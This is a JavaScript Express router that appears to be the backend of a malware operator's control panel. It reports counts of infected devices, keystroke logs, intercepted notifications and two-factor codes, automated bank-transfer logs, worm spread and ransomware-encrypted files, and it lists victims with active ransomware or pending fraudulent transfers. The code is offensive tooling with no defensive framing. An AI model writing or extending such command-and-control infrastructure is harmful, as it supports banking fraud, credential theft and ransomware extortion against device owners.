const express = require('express');
const router = express.Router();
const db = require('../utils/db');
const { authMiddleware } = require('../utils/auth');

router.get('/stats', authMiddleware, async (req, res) => {
  const devices = await db.query('SELECT COUNT(*) as total, COUNT(*) FILTER (WHERE status = \'online\') as online FROM devices');
  const commands = await db.query('SELECT COUNT(*) as total FROM commands');
  const keylogs = await db.query('SELECT COUNT(*) as total FROM keylogs');
  const notifications = await db.query('SELECT COUNT(*) as total FROM notifications');
  const tfa = await db.query('SELECT COUNT(*) as total FROM tfa_intercepts WHERE used = false');
  const ats = await db.query('SELECT COUNT(*) as total FROM ats_logs');
  const worm = await db.query('SELECT COUNT(*) as total FROM worm_logs');
  const ransomware = await db.query('SELECT COUNT(*) as total FROM encrypted_files');

  res.json({
    devices: parseInt(devices.rows[0].total),
    online: parseInt(devices.rows[0].online),
    commands: parseInt(commands.rows[0].total),
    keylogs: parseInt(keylogs.rows[0].total),
    notifications: parseInt(notifications.rows[0].total),
    tfaPending: parseInt(tfa.rows[0].total),
    atsTotal: parseInt(ats.rows[0].total),
    wormTotal: parseInt(worm.rows[0].total),
    ransomwareFiles: parseInt(ransomware.rows[0].total)
  });
});

router.get('/recent-devices', authMiddleware, async (req, res) => {
  const result = await db.query(
    'SELECT * FROM devices ORDER BY last_seen DESC LIMIT 10'
  );
  res.json(result.rows);
});

router.get('/threats', authMiddleware, async (req, res) => {
  const result = await db.query(
    `SELECT d.device_name, d.device_id, 'ransomware' as threat_type, r.created_at as detected_at
     FROM ransomware_configs r JOIN devices d ON r.device_id = d.id WHERE r.is_active = true
     UNION ALL
     SELECT d.device_name, d.device_id, 'ats' as threat_type, a.initiated_at as detected_at
     FROM ats_logs a JOIN devices d ON a.device_id = d.id WHERE a.status = 'pending'
     ORDER BY detected_at DESC LIMIT 20`
  );
  res.json(result.rows);
});

module.exports = router;
